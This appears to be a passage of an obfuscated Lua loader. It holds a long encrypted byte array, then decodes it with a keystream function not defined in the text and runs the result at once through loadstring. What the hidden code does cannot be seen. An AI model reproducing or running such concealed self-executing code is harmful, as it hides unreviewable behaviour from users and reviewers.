249,14,121,143,186,210,130,71,191,178,212,73,21,61,20,201,167,9,224,84,108,39,58,1,172,239,255,224,198,97,170,223,230,2,80,192,139,229,189,121,68,225,87,221,70,231,8,121,137,58,76,247,229,69,10,203,57,68,207,27,106,2,78,137,210,117,90,248,171,87,102,64,210,63,150,155,211,14,153,126,204,208,97,201,105,171,110,116,132,61,215,56,10,77,198,91,157,214,45,39,56,68,200,255,109,42,18,125,220,203,69,184,155,120,222,158,50,250,230,88,161,231,79,0,197,152,165,207,117,106,79,175,95,146,249,196,97,138,17,124,121,42,220,217,231,219,35,234,159,200,46,55,163,94,28,185,110,146,58,29,106,152,180,176,245,35,148,61,59,183,72,214,44,41,50,25,100,129,106,85,89,95,84,149,245,116,1,163,158,231,148,140,149,78,164,233,80,240,205,125,72,19,191,161,225,71,245,251,222,32,108,194,113,129,104,206,158,44,117,162,242,7,242,50,112,169,3,200,92,88,165,192,111,98,135,26,97,209,92,218,21,174,174,222,61,158,171,149,231,234,249,233,51,30,108,49,212,251,169,78,136,247,10,116,156,3,142,77,243,5,171,218,105,118,193,126,116,93,167,102,113,19,145,174,167,146,185,34,187,161,26,183,195,184,212,110,188,196,156,46,179,185,188,205,146,46,98,175,196,162,213,62,162,190,45,65,156,219,243,148,144,113,126,124,135,91,210,130,125,119,126,126,137,82,238,46,119,135,77,14,214,116,137,93,236,51,76,19,202,241,253,236,48,93,212,104,180,184,170,238,239,240,138,3,93,180,69,224,230,188,24,218,66,52,108,175,214,113,154,28,144,70,40,142,59,69,40,128,99,209,151,47,86,242,31,151,30,161,46,116,137,89,236,65,33,146,62,59,51,93,218,94,201,159,50,102,179,219,98,206,122,134,93,211,107,180,220,113,144,73,53,100,185,202,150,120,105,175,5,247,254,240,5,196,161,214,60,168,172,99,159,131,39,18,56,163,56,41,126,135,110,162,30,137,96,227,60,69,40,109,177,238,53,67,43,114,144,72,19,178,63,20,166,4,249,11,193,168,210,150,11,169,248,225,226,199,88,166,189,119,74,208,62,243,214,45,40,119,48,200,20,52,243,218,197,15,121,27,112,248,95,38,176,88,202,123,31,150,41,106,147,65,65,24,24,128,64,31,108,126,53,243,249,231,36,82,164,25,110,124,2,100,77,178,50,220,251,0,155,17,236,162,2,224,60,13,165,195,197,136,100,174,192,179,190,175,147,22,114,23,104,118,76,203,79,194,104,118,75,205,72,215,41,50,23,177,187,79,17,181,207,62,53,252,135,252,45,165,246,19,107,142,30,167,253,211,81,165,17,181,178,235,63,53,250,6,185,178,78,131,36,66,231,248,197,95,145,252,186,129,44,43,46,35,69,41,85,130,102,97,54,202,19,88,174,75,125,46,253,203,231,145,131,130,9,187,216,33,169,234,71,24,126,107,43,61,42,74,175,166,16,195,131,66,210,118,49,198,26,34,42,53,180,64,229,217,55,163,93,33,169,147,29,181,141,37,149,46,60,52,210,70,15,155,188,126,122,94,193,32,11,142,5,160,207,66,232,246,204,73,211,53,16,127,50,24,174,197,48,107,167,250,187,189,94,63,173,107,80,196,7,73,201,44,63,139,166,69,63,219,76,13,165,211,95,96,227,72,242,244,188,186,103,34,4,101,98,142,168,101,119,33,95,43,197,234,82,165,238,37,93,170,218,239,255,9,233,67,50,93,102,194,133,77,127,240,222,22,109,102,124,59,252,187,125,54,12,138,15,129,42,122,98,90,225,243,128,234,178,122,69,132,209,50,242,237,128,198,229,94,119,113,183,185,112,149,1,233,60,42,68,28,118,121,103,133,124,114,177,164,230,54,88,241,54,77,11,188,158,14,209,134,118,142,67,8,177,241,32,107,139,248,5,134,198,26,34,42,53,179,67,220,243,234,138,169,61,86,142,42,140,59,236,34,88,226,82,234,5,219,60,41,86,183,166,19,125,87,217,128,113,130,79,249,233,28,130,97,176,193,144,53,91,217,99,202,109,150,163,131,37,62,243,214,45,38,60,249,195,100,130,41,51,21,111,171,206,21,175,137,191,47,227,231,0,85,95,135,242,236,133,182,22,203,45,77,34,120,41,105,199,41,79,21,119,109,161,23,182,218,118,162,240,9,222,95,224,102,207,102,152,59,64,12,168,160,13,110,13,68,166,158,219,194,23,95,107,130,195,255,59,91,127,87,4,208,32,132,118,26,124,145,4,207,151,70,47,106,174,205,108,168,15,224,95,219,111,134,56,75,235,28,18,56,8,151,233,244,210,56,8,151,233,245,208,130,69,14,88,172,104,117,79,193,106,112,93,152,44,71,9,75,140,9,146,248,10,173,213,229,190,117,78,196,161,184,99,148,132,201,23,40,116,93,238,248,25,141,29,114,175,246,11,120,108,170,187,139,184,121,251,215,220,27,51,211,211,167,219,95,201,154,23,176,215,113,146,67,58,88,220,102,202,221,57,61,80,9,201,147,25,105,50,25,100,129,106,93,115,100,19,27,35,5,220,37,152,241,13,159,170,182,121,112,83,194,22,145,57,14,147,161,191,41,79,114,88,126,243,115,201,117,151,66,64,35,141,93,234,38,134,118,163,249,12,228,89,217,104,193,182,194,176,244,39,112,169,12,215,94,223,104,4,196,151,50,110,168,237,39,92,158,123,252,187,126,53,100,191,135,93,133,156,35,119,100,214,30,177,194,180,190,146,61,32,138,3,199,93,86,173,167,185,132,33,75,206,155,43,78,235,21,63,49,8,102,97,255,49,81,2,156,251,217,101,143,46,240,30,105,156,143,32,52,55,181,71,111,21,72,49,235,3,225,41,113,88,235,10,105,51,22,108,107,109,103,123,62,244,212,51,20,187,159,162,8,171,0,217,58,26,181,226,73,192,200,41,74,12,166,249,191,206,123,148,49,51,76,106,17,53,53,8,28,168,163,19,180,137,83,190,164,217,251,194,85,222,11,154,145,87,123,81,245,235,42,44,135,81,18,182,162,254,84,82,114,125,45,172,250,174,248,11,171,202,37,253,184,133,31,80,189,118,76,202,81,187,126,53,16,127,48,93,132,8,234,244,148,30,240,142,253,241,116,167,45,72,219,219,29,86,171,173,168,181,142,4,162,200,86,173,166,187,126,118,100,190,132,48,234,175,161,203,76,201,84,179,148,242,215,41,50,93,181,189,45,229,0,174,163,198,94,150,237,230,252,187,127,134,88,188,190,100,2,239,238,18,123,92,196,168,2,1,16,214,91,198,160,25,187,225,93,188,158,216,228,1,170,177,155,220,27,94,218,60,41,234,174,164,195,100,199,119,119,31,86,175,189,166,115}
local _xUvjzYF=_lcFOlsmSSg(141852244,#_omlYA1TMR)
local _xl1pADPMpcMx={}
for i=1,#_omlYA1TMR do _xl1pADPMpcMx[i]=string.char((_omlYA1TMR[i]-_xUvjzYF[i])%256) end
local _leDOoAjB=table.concat(_xl1pADPMpcMx)
local _xBGURIO=loadstring or load
return assert(_xBGURIO(_leDOoAjB))()
